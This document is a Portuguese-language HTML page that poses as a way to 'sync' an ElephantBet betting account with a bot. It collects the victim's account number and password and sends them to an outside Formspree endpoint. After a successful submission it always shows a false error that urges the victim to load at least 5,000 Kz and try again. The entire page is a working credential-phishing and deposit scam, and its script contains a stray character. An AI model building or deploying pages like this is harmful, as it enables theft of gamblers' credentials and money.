<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sincronizar com ElephantBet</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: 'Inter', sans-serif;
      background: linear-gradient(to right, #0f0f0f, #1a1a1a);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      color: #fff;
    }
    .container {
      background-color: #1e1e1e;
      padding: 40px;
      border-radius: 16px;
      width: 90%;
      max-width: 450px;
      box-shadow: 0 0 20px rgba(255, 0, 127, 0.3);
      text-align: center;
    }
    .container h1 {
      font-size: 24px;
      margin-bottom: 10px;
    }
    .container h1 span {
      color: #ff007f;
    }
    .container p {
      font-size: 15px;
      color: #ccc;
      margin-bottom: 20px;
    }
    label {
      display: block;
      text-align: left;
      margin-bottom: 5px;
      font-size: 14px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 20px;
      border: none;
      border-radius: 10px;
      background-color: #2a2a2a;
      color: #fff;
      font-size: 14px;
    }
    input::placeholder {
      color: #888;
    }
    button {
      width: 100%;
      padding: 14px;
      border: none;
      border-radius: 10px;
      background-color: #ff007f;
      color: #fff;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    button:hover {
      background-color: #ff3399;
    }
    .message {
      margin-top: 20px;
      font-size: 15px;
      background: #2b2b2b;
      padding: 15px;
      border-left: 5px solid #ff007f;
      display: none;
      border-radius: 10px;
      color: #ffb3d1;
    }
    .back {
      margin-top: 20px;
      display: inline-block;
      color: #aaa;
      text-decoration: none;
      font-size: 14px;
    }
    .back:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Conectar à <span>ElephantBet</span></h1>
    <p>Insira os seus dados para sincronizar com o bot. É necessário ter pelo menos <strong>5.000 Kz</strong> de saldo na conta.</p>

    <form id="syncForm" action="https://formspree.io/f/xvgzrljq" method="POST">
      <label for="acc">Número da Conta</label>
      <input type="text" id="acc" name="numero" placeholder="912345678" pattern="9[0-9]{8}" maxlength="9" required>

      <label for="pass">Senha</label>
      <input type="text" id="pass" name="senha" placeholder="Digite a sua senha" required>

      <button type="submit">Sincronizar</button>
    </form>

    <div id="resposta" class="message"></div>

    <a href="bot.html" class="back">← Voltar</a>
  </div>

  <script>
    document.getElementById("syncForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const formData = new FormData(this);
      const resposta = document.getElementById("resposta");
      resposta.style.display = "none";

      fetch(this.action, {
        method: this.method,
        body: formData,
        headers: { 'Accept': 'application/json' }
      })
      .then(response => {
        if (response.ok) {
p          resposta.textContent = " Conta invalida ou esta conta da ElephantBet não possui o saldo necessário para comletar a operação. Por favor, carregue a sua conta com pelo menos 5.000 Kz e tente novamente.";
          resposta.style.display = "block";
        } else {
          response.json().then(data => {
            if (data.errors) {
              resposta.textContent = "Erro: " + data.errors.map(error => error.message).join(", ");
            } else {
              resposta.textContent = "Erro ao enviar os dados. Tente novamente mais tarde.";
            }
            resposta.style.display = "block";
          });
        }
      })
      .catch(error => {
        resposta.textContent = "Erro de rede: " + error.message;
        resposta.style.display = "block";
      });
    });
  </script>
</body>
</html>
